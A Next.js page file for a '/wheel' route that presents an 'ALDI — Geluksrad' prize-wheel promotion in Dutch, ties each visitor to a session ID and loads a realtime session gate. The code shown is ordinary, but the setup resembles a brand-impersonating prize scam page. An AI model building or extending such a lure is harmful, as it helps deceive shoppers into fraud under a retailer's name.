import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { buildShareMetadata } from "@/lib/share-metadata";
import { WheelClient } from "./wheel-client";

export const dynamic = 'force-dynamic';

export async function generateMetadata() {
  return buildShareMetadata({
    title: "ALDI — Geluksrad",
    description:
      "ALDI speciale actie Geluksrad! Probeer uw geluk en win exclusieve prijzen.",
    canonical: "/wheel",
  });
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function WheelPage({ searchParams }: Props) {
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: await searchParams,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <WheelClient sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
